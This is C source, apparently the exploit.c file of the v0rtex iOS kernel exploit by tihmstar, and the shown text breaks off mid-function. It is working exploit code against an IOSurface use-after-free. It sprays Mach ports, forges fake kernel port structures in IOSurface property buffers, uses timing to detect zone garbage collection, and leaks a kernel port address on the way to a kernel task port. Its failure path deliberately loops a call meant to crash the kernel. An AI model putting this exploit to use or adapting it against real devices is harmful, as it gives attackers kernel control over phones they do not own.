//
//  exploit.c
//  v0rtex
//
//  Created by tihmstar on 10.12.17.
//  Copyright Â© 2017 tihmstar. All rights reserved.
//

#include "exploit.h"
#include <CoreFoundation/CoreFoundation.h>
#include <sched.h>
#include <sys/mman.h>
#include "offsetfinder.h"
#import <Foundation/Foundation.h>
#include <dlfcn.h>


#ifndef __i386__

mach_msg_return_t    mach_msg_(
                               mach_msg_header_t *msg,
                               mach_msg_option_t option,
                               mach_msg_size_t send_size,
                               mach_msg_size_t rcv_size,
                               mach_port_name_t rcv_name,
                               mach_msg_timeout_t timeout,
                               mach_port_name_t notify){
    static mach_msg_return_t    ((*mach_msg__)(
                                               mach_msg_header_t *msg,
                                               mach_msg_option_t option,
                                               mach_msg_size_t send_size,
                                               mach_msg_size_t rcv_size,
                                               mach_port_name_t rcv_name,
                                               mach_msg_timeout_t timeout,
                                               mach_port_name_t notify)) = NULL;
    if (!mach_msg__) {
        mach_msg__ = dlsym(RTLD_DEFAULT, "mach_msg");
    }
    return mach_msg__(msg,option,send_size,rcv_size,rcv_name,timeout,notify);
}
kern_return_t mach_ports_register_
(
 task_t target_task,
 mach_port_array_t init_port_set,
 mach_msg_type_number_t init_port_setCnt
 ){
    static kern_return_t ((*mach_ports_register__)
                          (
                           task_t target_task,
                           mach_port_array_t init_port_set,
                           mach_msg_type_number_t init_port_setCnt
                           )) = NULL;
    if (!mach_ports_register__) {
        mach_ports_register__ = dlsym(RTLD_DEFAULT, "mach_ports_register");
    }
    return mach_ports_register__(target_task,init_port_set,init_port_setCnt);
}
kern_return_t mach_ports_lookup_
(
 task_t target_task,
 mach_port_array_t *init_port_set,
 mach_msg_type_number_t *init_port_setCnt
 ){
    static kern_return_t ((*mach_ports_lookup__)
                          (
                           task_t target_task,
                           mach_port_array_t *init_port_set,
                           mach_msg_type_number_t *init_port_setCnt
                           )) = NULL;
    if (!mach_ports_lookup__) {
        mach_ports_lookup__ = dlsym(RTLD_DEFAULT, "mach_ports_lookup");
    }
    return mach_ports_lookup__(target_task,init_port_set,init_port_setCnt);
}


#define mach_msg(a,b,c,d,e,f,g) mach_msg_(a,b,c,d,e,f,g)
#define mach_ports_register(a,b,c) mach_ports_register_(a,b,c)
#define mach_ports_lookup(a,b,c) mach_ports_lookup_(a,b,c)
const uint32_t IOSURFACE_CREATE_SURFACE =  0;
const uint32_t IOSURFACE_SET_VALUE      =  9;
const uint32_t IOSURFACE_GET_VALUE      = 10;
const uint32_t IOSURFACE_DELETE_VALUE   = 11;

const uint32_t IKOT_TASK                = 2;

#ifndef DEBUG
#define DRM
#endif
int mccall(uint32_t arg1, uint32_t arg2, uint32_t arg3, uint32_t arg4);
extern pid_t mpd;

#define postProgress(prg) [[NSNotificationCenter defaultCenter] postNotificationName: @"JB" object:nil userInfo:@{@"JBProgress": prg}]

#define IOSURFACE_CREATE_OUTSIZE 0xbc8 /* XXX 0x6c8 for iOS 11.0, 0xbc8 for 11.1.2 */


#define OFFSET_TASK_ITK_SELF_HARDCODE 0x100
#define OFFSET_IOUSERCLIENT_IPC_HARDCODE 0x80

#define OFFSET_REALHOST_SPECIAL                     0x8
#define OFFSET_ZONE_MAP                             guoffsets->offset_zone_map
#define OFFSET_KERNEL_MAP                           guoffsets->offset_kernel_map
#define OFFSET_KERNEL_TASK                          guoffsets->offset_kernel_task
#define OFFSET_REALHOST                             guoffsets->offset_realhost
#define OFFSET_BZERO                                guoffsets->offset_bzero
#define OFFSET_BCOPY                                guoffsets->offset_bcopy
#define OFFSET_COPYIN                               guoffsets->offset_copyin
#define OFFSET_COPYOUT                              guoffsets->offset_copyout
#define OFFSET_IPC_PORT_ALLOC_SPECIAL               guoffsets->offset_ipc_port_alloc_special
#define OFFSET_IPC_KOBJECT_SET                      guoffsets->offset_ipc_kobject_set
#define OFFSET_IPC_PORT_MAKE_SEND                   guoffsets->offset_ipc_port_make_send
#define OFFSET_ROP_LDR_R0_R0_0XC                    guoffsets->offset_rop_ldr_r0_r0_0xc
#define OFFSET_CHGPROCCNT                           guoffsets->offset_chgproccnt
#define OFFSET_KAUTH_CRED_REF                       guoffsets->offset_kauth_cred_ref
#define OFFSET_OSSERIALIZER_SERIALIZE               guoffsets->offset_OSSerializer_serialize
#define OFFSET_IPC_SPACE_IS_TASK                    guoffsets->offset_ipc_space_is_task
#define OFFSET_TASK_ITK_SELF                        guoffsets->offset_task_itk_self
#define OFFSET_TASK_ITK_REGISTERED                  guoffsets->offset_task_itk_registered
#define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX     guoffsets->offset_vtab_get_external_trap_for_index
#define OFFSET_IOUSERCLIENT_IPC                     guoffsets->offset_iouserclient_ipc
#define OFFSET_PROC_UCRED                           guoffsets->offset_proc_ucred
#define OFFSET_TASK_BSD_INFO                        guoffsets->offset_task_bsd_info
#define OFFSET_SIZEOF_TASK                          guoffsets->offset_sizeof_task

enum{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    
    kOSSerializeEndCollection   = 0x80000000U,
    
    kOSSerializeMagic           = 0x000000d3U,
};

#define KPTR_ALIGN(addr) (((addr) + sizeof(kptr_t) - 1) & ~(sizeof(kptr_t) - 1))

// IOKit cruft
typedef mach_port_t io_service_t;
typedef mach_port_t io_connect_t;
extern const mach_port_t kIOMasterPortDefault;
CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *client);
kern_return_t IOServiceClose(io_connect_t client);
kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selector, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint32_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

static const char *errstr(int r){
    return r == 0 ? "success" : strerror(r);
}

static uint32_t transpose(uint32_t val){
    uint32_t ret = 0;
    for(size_t i = 0; val > 0; i += 8){
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

static kern_return_t my_mach_zone_force_gc(host_t host)
{
    return 0;
}

static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name, mach_vm_address_t *context){
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
    } Request __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_vm_address_t context;
        mach_msg_trailer_t trailer;
    } Reply __attribute__((unused));
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_vm_address_t context;
    } __Reply __attribute__((unused));
#pragma pack()
    
    union {
        Request In;
        Reply Out;
    } Mess;
    
    Request *InP = &Mess.In;
    Reply *Out0P = &Mess.Out;
    
    InP->NDR = NDR_record;
    InP->name = name;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3228;
    InP->Head.msgh_reserved = 0;
    
    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    if(ret == KERN_SUCCESS)
        ret = Out0P->RetCode;
    
    if(ret == KERN_SUCCESS)
        *context = Out0P->context;
    
    return ret;
}

kern_return_t my_mach_port_set_context(task_t task, mach_port_name_t name, mach_vm_address_t context){
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        mach_port_name_t name;
        mach_vm_address_t context;
    } Request;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()
    
    union {
        Request In;
        Reply Out;
    } Mess;
    
    Request *InP = &Mess.In;
    Reply *OutP = &Mess.Out;
    
    InP->NDR = NDR_record;
    InP->name = name;
    InP->context = context;
    InP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    InP->Head.msgh_remote_port = task;
    InP->Head.msgh_local_port = mig_get_reply_port();
    InP->Head.msgh_id = 3229;
    InP->Head.msgh_reserved = 0;
    
    kern_return_t ret = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
        ret = OutP->RetCode;

    return ret;
}

// Raw MIG function for a merged IOSurface deleteValue + setValue call, attempting to increase performance.
// Prepare everything - sched_yield() - fire.
static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uint32_t propertyId, void *buf, mach_vm_size_t len){
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        uint32_t inband_input[4];
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } DeleteRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } SetRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_type_number_t inband_outputCnt;
        char inband_output[4096];
        mach_msg_type_number_t scalar_outputCnt;
        uint64_t scalar_output[16];
        mach_vm_size_t ool_output_size;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()
    
    // Delete
    union {
        DeleteRequest In;
        Reply Out;
    } DMess;
    
    DeleteRequest *DInP = &DMess.In;
    Reply *DOutP = &DMess.Out;
    
    DInP->NDR = NDR_record;
    DInP->selector = IOSURFACE_DELETE_VALUE;
    DInP->scalar_inputCnt = 0;
    
    DInP->inband_input[0] = surfaceId;
    DInP->inband_input[2] = transpose(propertyId);
    DInP->inband_input[3] = 0x0; // Null terminator
    DInP->inband_inputCnt = sizeof(DInP->inband_input);
    
    DInP->ool_input = 0;
    DInP->ool_input_size = 0;
    
    DInP->inband_outputCnt = sizeof(uint32_t);
    DInP->scalar_outputCnt = 0;
    DInP->ool_output = 0;
    DInP->ool_output_size = 0;
    
    DInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    DInP->Head.msgh_remote_port = client;
    DInP->Head.msgh_local_port = mig_get_reply_port();
    DInP->Head.msgh_id = 2865;
    DInP->Head.msgh_reserved = 0;
    
    // Set
    union {
        SetRequest In;
        Reply Out;
    } SMess;
    
    SetRequest *SInP = &SMess.In;
    Reply *SOutP = &SMess.Out;
    
    SInP->NDR = NDR_record;
    SInP->selector = IOSURFACE_SET_VALUE;
    SInP->scalar_inputCnt = 0;
    
    SInP->inband_inputCnt = 0;
    
    SInP->ool_input = (mach_vm_address_t)buf;
    SInP->ool_input_size = len;
    
    SInP->inband_outputCnt = sizeof(uint32_t);
    SInP->scalar_outputCnt = 0;
    SInP->ool_output = 0;
    SInP->ool_output_size = 0;
    
    SInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    SInP->Head.msgh_remote_port = client;
    SInP->Head.msgh_local_port = mig_get_reply_port();
    SInP->Head.msgh_id = 2865;
    SInP->Head.msgh_reserved = 0;
    
    // Deep breath
    usleep(50);
    sched_yield();
    
    // Fire
    kern_return_t ret = mach_msg(&DInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(DeleteRequest), (mach_msg_size_t)sizeof(Reply), DInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if(ret == KERN_SUCCESS)
        ret = DOutP->RetCode;
    
    if(ret != KERN_SUCCESS)
        return ret;

    ret = mach_msg(&SInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(SetRequest), (mach_msg_size_t)sizeof(Reply), SInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    if(ret == KERN_SUCCESS)
        ret = SOutP->RetCode;
    
    return ret;
}

typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
#ifdef __LP64__
        uint32_t pad;
#endif
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    union {
        kptr_t *premsg;
        struct {
            uint8_t sync_qos[7];
            uint8_t special_port_qos;
        } qos_counter;
    } kdata2;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef struct {
    union {
        kptr_t port;
        uint32_t index;
    } notify;
    union {
        uint32_t name;
        kptr_t size;
    } name;
} kport_request_t;

typedef union
{
    struct {
        struct {
            kptr_t data;
            uint32_t reserved : 24,
            type     :  8;
#ifdef __LP64__
            uint32_t pad;
#endif
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
#ifdef __LP64__
        uint32_t pad;
#endif
        kptr_t map;
    } a;
    struct {
//        char pad[OFFSET_TASK_ITK_SELF];
//        kptr_t itk_self;
        char _itk_self[OFFSET_TASK_ITK_SELF_HARDCODE];
    } b;
} ktask_t;



void die(){
    postProgress(@"Kernelexploit failed");
    printf("Kernelexploit failed, goodbye...\n");
    sleep(3);
    // open user client
    CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
    io_connect_t connect = 0;
    IOServiceOpen(service, mach_task_self(), 0, &connect);
    
    // add notification port with same refcon multiple times
    mach_port_t port = 0;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    uint32_t references;
    uint64_t input[3] = {0};
    input[1] = 1234;  // keep refcon the same value
    while (1)
        IOConnectCallAsyncStructMethod(connect, 17, port, &references, 1, input, sizeof(input), NULL, NULL);
}

#define RELEASE_PORT(port) \
do{ \
    if(MACH_PORT_VALID((port))){ \
        _kernelrpc_mach_port_destroy_trap(self, (port)); \
        port = MACH_PORT_NULL; \
    } \
} while(0)


#define assure(cond) do {if (!(cond)){ printf("Error: assure failed at line %d\n",__LINE__);die(); }} while(0)
#define doassure(cond,code) do {if (!(cond)){(code);assure(cond);}} while(0)
#define LOG(a...) (printf(a),printf("\n"))
int v0rtex(task_t *tfp0, kptr_t *kbase){
    kern_return_t retval = KERN_FAILURE,
    ret;
    task_t self = mach_task_self();
    host_t host = mach_host_self();
    mach_port_array_t maps = NULL;
    mach_port_t stuffport = MACH_PORT_NULL;
    
    assure(OFFSET_IOUSERCLIENT_IPC<OFFSET_IOUSERCLIENT_IPC_HARDCODE);
    assure(OFFSET_TASK_ITK_SELF<OFFSET_TASK_ITK_SELF_HARDCODE);
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("service: %x", service);
    assure(MACH_PORT_VALID(service));

    io_connect_t client = MACH_PORT_NULL;
    ret = IOServiceOpen(service, self, 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    assure(!ret);

    assure(MACH_PORT_VALID(client));
    uint32_t dict_create[] ={
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 19,
                0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
            kOSSerializeEndCollection | kOSSerializeNumber | 32,
                0x1000,
        0x0,
    };
    
    union{
        char _padding[IOSURFACE_CREATE_OUTSIZE]; // XXX 0x6c8 for iOS 11
        struct{
            mach_vm_address_t addr1;
            mach_vm_address_t addr2;
            uint32_t id;
        } data;
    } surface;
    
    size_t size = sizeof(surface);
    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
    LOG("newSurface: %s", mach_error_string(ret));
    assure(!ret);
    
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &stuffport);
    LOG("stuffport: %x, %s", stuffport, mach_error_string(ret));
    assure(!ret && MACH_PORT_VALID(stuffport));
    
    ret = _kernelrpc_mach_port_insert_right_trap(self, stuffport, stuffport, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    assure(!ret);
    mach_port_t realport = MACH_PORT_NULL;
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &realport);
    
    doassure(!ret,{
        LOG("mach_port_allocate: %s", mach_error_string(ret));
    });
    doassure(MACH_PORT_VALID(realport),{
        LOG("realport: %x", realport);
    });
#define NUM_GC 0x1000
    mach_port_t gc[NUM_GC] = { MACH_PORT_NULL };
    for(size_t i = 0; i < NUM_GC; ++i){
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &gc[i]);
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }
    
#define NUM_BEFORE 0x1000
    mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };
    for(size_t i = 0; i < NUM_BEFORE; ++i){
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &before[i]);
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }
    
    mach_port_t port = MACH_PORT_NULL;
    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &port);
    doassure(!ret,{
        LOG("mach_port_allocate: %s", mach_error_string(ret));
    });
    doassure(MACH_PORT_VALID(port),{
        LOG("port: %x", port);
    });
    
#define NUM_AFTER 0x100
    mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
    for(size_t i = 0; i < NUM_AFTER; ++i){
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &after[i]);
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
    }
    
    LOG("realport: %x", realport);
    LOG("port: %x", port);
    ret = _kernelrpc_mach_port_insert_right_trap(self, port, port, MACH_MSG_TYPE_MAKE_SEND);
    LOG("mach_port_insert_right: %s", mach_error_string(ret));
    assure(!ret);
    
#pragma pack(4)
    typedef struct {
        mach_msg_base_t base;
        mach_msg_ool_ports_descriptor_t desc[2];
    } StuffMsg;
#pragma pack()
    StuffMsg msg;
    msg.base.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    msg.base.header.msgh_remote_port = stuffport;
    msg.base.header.msgh_local_port = MACH_PORT_NULL;
    msg.base.header.msgh_id = 1234;
    msg.base.header.msgh_reserved = 0;
    msg.base.body.msgh_descriptor_count = 2;
    msg.desc[0].address = before;
    msg.desc[0].count = NUM_BEFORE;
    msg.desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    msg.desc[0].deallocate = FALSE;
    msg.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg.desc[1].address = after;
    msg.desc[1].count = NUM_AFTER;
    msg.desc[1].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    msg.desc[1].deallocate = FALSE;
    msg.desc[1].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ret = mach_msg(&msg.base.header, MACH_SEND_MSG, (mach_msg_size_t)sizeof(msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    LOG("mach_msg: %s", mach_error_string(ret));
    assure(!ret);
    
    for(size_t i = NUM_AFTER; i > 0; --i){
        if(MACH_PORT_VALID(after[i - 1])){
            _kernelrpc_mach_port_destroy_trap(self, after[i - 1]);
            after[i - 1] = MACH_PORT_NULL;
        }
    }
    for(size_t i = NUM_BEFORE; i > 0; --i){
        if(MACH_PORT_VALID(before[i - 1])){
            _kernelrpc_mach_port_destroy_trap(self, before[i - 1]);
            before[i - 1] = MACH_PORT_NULL;
        }
    }
    
    // There seems to be some weird asynchronity with freeing on IOConnectCallAsyncStructMethod,
    // which sucks. To work around it, I register the port to be freed on my own task (thus increasing refs),
    // sleep after the connect call and register again, thus releasing the reference synchronously.
    ret = mach_ports_register(self, &port, 1);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    assure(!ret);
    
    uint32_t ref;
    uint64_t in[3] = { 0, 0x666, 0 };
    IOConnectCallAsyncStructMethod(client, 17, realport, &ref, 1, in, sizeof(in), NULL, NULL);
    IOConnectCallAsyncStructMethod(client, 17, port, &ref, 1, in, sizeof(in), NULL, NULL);

    // Prevent cleanup
    mach_port_t fakeport = port;
    port = MACH_PORT_NULL;

#define DATA_SIZE 0x1000
    uint32_t dict[DATA_SIZE / sizeof(uint32_t) + 7] ={
        // Some header or something
        surface.data.id,
        0x0,
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,
        kOSSerializeString | (DATA_SIZE - 1),
    };
    dict[DATA_SIZE / sizeof(uint32_t) + 5] = kOSSerializeEndCollection | kOSSerializeString | 4;

    // ipc.ports zone uses 0x3000 allocation chunks, but hardware page size before A9
    // is actually 0x1000, so references to our reallocated memory may be shifted
    // by (0x1000 % sizeof(kport_t))
    kport_t triple_kport ={
        .ip_bits = 0x80000000, // IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE
        .ip_references = 100,
        .ip_lock ={
            .type = 0x11,
        },
        .ip_messages ={
            .port ={
                .receiver_name = 1,
                .msgcount = MACH_PORT_QLIMIT_KERNEL,
                .qlimit = MACH_PORT_QLIMIT_KERNEL,
            },
        },
        .ip_srights = 99,
    };
    
    for(uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
        *(volatile kport_t*)ptr = triple_kport;
    
    
    LOG("herp derp");
    usleep(150000);
    
    sched_yield();
    ret = mach_ports_register(self, &client, 1); // gonna use that later
    LOG("mach_ports_register: %s", mach_error_string(ret));
    assure(!ret);
    for(size_t i = NUM_GC; i > 0; --i){
        if(MACH_PORT_VALID(gc[i - 1])){
            _kernelrpc_mach_port_destroy_trap(self, gc[i - 1]);
            gc[i - 1] = MACH_PORT_NULL;
        }
    }
    _kernelrpc_mach_port_destroy_trap(self, stuffport);
    
    
    size_t finalI = 0;
    for(size_t i = 0; i < NUM_GC; ++i){
        uint64_t t0,t1;
        t0 = mach_absolute_time();
        ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &gc[i]);
        t1 = mach_absolute_time();
        doassure(!ret,{
            LOG("mach_port_allocate: %s", mach_error_string(ret));
        });
        if (t1-t0 > 1000) {
            LOG("my_gc breaking at %d with tdiff=%lld",(int)i,t1-t0);
            finalI = i;
            break;
        }
    }
    
//    doassure(!my_mach_zone_force_gc(host), {
//        LOG("mach_zone_force_gc: %s", mach_error_string(ret));
//    });

    for(uint32_t i = 0; i < 0x4000; ++i){
        dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(i);
        volatile kport_t *dptr = (kport_t*)&dict[5];
        for(size_t j = 0; j < DATA_SIZE / sizeof(kport_t); ++j){
            dptr[j].ip_context = (dptr[j].ip_context & 0xffffffff) | ((uint64_t)(0x10000000 | i) << 32);
        }
        uint32_t dummy;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
        doassure(!ret, {
            LOG("setValue(%u): %s", i, mach_error_string(ret));
        });
    }
    LOG("accessing port...");
    usleep(500);

    uint64_t ctx = 0xffffffff;
    ret = my_mach_port_get_context(self, fakeport, &ctx);
    LOG("mach_port_get_context: 0x%016llx, %s", ctx, mach_error_string(ret));
    assure(!ret);

    uint32_t shift_mask = ctx >> 60;
    doassure(!(shift_mask < 1 || shift_mask > 3), {
        LOG("Invalid shift mask.");
    });

    for(size_t i = 0; i <= finalI; i++){
        if(MACH_PORT_VALID(gc[i - 1])){
            _kernelrpc_mach_port_destroy_trap(self, gc[i - 1]);
            gc[i - 1] = MACH_PORT_NULL;
        }
    }
    
    uint32_t shift_off = sizeof(kport_t) - (((shift_mask - 1) * 0x1000) % sizeof(kport_t));

    uint32_t idx = (ctx >> 32) & 0xfffffff;
    dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(idx);
    uint32_t request[] ={
        // Same header
        surface.data.id,
        0x0,
        transpose(idx), // Key
        0x0, // Null terminator
    };

    kport_t kport ={
        .ip_bits = 0x80000000, // IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE
        .ip_references = 100,
        .ip_lock ={
            .type = 0x11,
        },
        .ip_messages ={
            .port ={
                .receiver_name = 1,
                .msgcount = MACH_PORT_QLIMIT_KERNEL,
                .qlimit = MACH_PORT_QLIMIT_KERNEL,
            },
        },
        .ip_srights = 99,
    };


//    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
//        *(volatile kport_t*)ptr = kport;
//
//    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
//    LOG("reallocate_buf: %s", mach_error_string(ret));
//    assure(!ret);
    
    // Register realport on fakeport
    mach_port_t notify = MACH_PORT_NULL;
    ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
    LOG("mach_port_request_notification(realport): %x, %s", notify, mach_error_string(ret));
    assure(!ret);
   
    uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))] = { 0 };
    size = sizeof(response);
    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
    LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
    assure(!ret);
    doassure(size >= DATA_SIZE + 0x10, {
        LOG("Response too short.");
    });

    uint32_t fakeport_off = -1;
    kptr_t realport_addr = 0;
    for(uintptr_t ptr = (uintptr_t)&response[4] + shift_off, end = (uintptr_t)&response[4] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t)){
        kptr_t val = ((volatile kport_t*)ptr)->ip_pdrequest;
        if(val){
            fakeport_off = ptr - (uintptr_t)&response[4];
            realport_addr = val;
            break;
        }
    }
    doassure(realport_addr, {
        LOG("Failed to leak realport address");
    });

    LOG("realport addr: %p", (void*)realport_addr);
    volatile kport_t *fakeport_buf = (volatile kport_t*)((uintptr_t)&dict[5] + fakeport_off);

    // Register fakeport on itself (and clean ref on realport)
    notify = MACH_PORT_NULL;
    ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, fakeport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
    LOG("mach_port_request_notification(fakeport): %x, %s", notify, mach_error_string(ret));
    assure(!ret);

    size = sizeof(response);
